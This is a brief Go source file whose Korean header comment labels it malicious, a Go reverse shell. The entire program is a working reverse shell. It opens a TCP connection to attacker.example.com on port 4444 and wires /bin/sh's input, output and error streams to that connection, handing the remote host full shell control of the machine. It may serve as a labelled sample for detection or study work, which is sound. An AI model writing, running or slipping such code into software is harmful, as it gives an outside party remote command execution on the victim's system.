// 악성 — Go 역방향 셸 (attacker.example.com에 접속 후 표준 입출력을 /bin/sh에 연결)
package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "attacker.example.com:4444")
	if err != nil {
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
